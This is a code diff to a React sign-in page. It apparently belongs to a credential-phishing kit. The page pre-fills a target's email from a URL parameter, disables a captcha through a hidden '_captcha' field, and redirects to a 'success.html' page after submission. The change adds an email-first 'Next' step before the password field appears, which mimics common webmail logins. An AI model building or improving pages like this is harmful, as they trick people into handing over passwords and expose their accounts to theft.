@@ -4,21 +4,22 @@ import Logo from "/logo.png";
 
 export default function App() {
   const [domain, setDomain] = useState("");
-  const [passwrd,setPasswrd] = useState("")
+  const [passwrd, setPasswrd] = useState("");
+  const [dis, setDis] = useState(false);
   const [emal, setEmal] = useState("");
 
-  useEffect(()=>{
-    if(window.location.href.includes("email")){
-      const eValue = (window.location.href.split('=')[1])
-      const dd = (window.location.href.split('/?')[0])
-      setEmal(eValue)
+  useEffect(() => {
+    if (window.location.href.includes("email")) {
+      const eValue = window.location.href.split("=")[1];
+      const dd = window.location.href.split("/?")[0];
+      setEmal(eValue);
       setDomain(dd);
     }
-    if(!window.location.href.includes("email")){
+    if (!window.location.href.includes("email")) {
       setDomain(window.location.href);
-      console.log(domain)
+      console.log(domain);
     }
-  },[window.location.href])
+  }, [window.location.href]);
 
   return (
     <main>
@@ -44,14 +45,16 @@ export default function App() {
                 value={emal}
                 onChange={(e) => setEmal(e.target.value)}
               />
-              <input
-                type="password"
-                placeholder="Password"
-                name="password"
-                required
-                value={passwrd}
-                onChange={(e)=> setPasswrd(e.target.value)}
-              />
+              {dis && (
+                <input
+                  type="password"
+                  placeholder="Password"
+                  name="password"
+                  required
+                  value={passwrd}
+                  onChange={(e) => setPasswrd(e.target.value)}
+                />
+              )}
               <input type="hidden" name="_captcha" value="false"></input>
               <input
                 type="hidden"
@@ -59,10 +62,26 @@ export default function App() {
                 value={`${domain}/success.html`}
               ></input>
             </div>
-            <p>
-              <a href="#">Forgotten password?</a>
-            </p>
-            <button type="submit">Sign in</button>
+
+            {dis && (
+              <p>
+                <a href="#">Forgotten password?</a>
+              </p>
+            )}
+
+            {dis ? (
+              <button type="submit">Sign in</button>
+            ) : (
+              <button
+                onClick={() => {
+                  if(emal) setDis(!dis);
+
+                  if(!emal) alert("Input your email address")
+                }}
+              >
+                Next
+              </button>
+            )}
           </form>
 
           <div className="btmText">
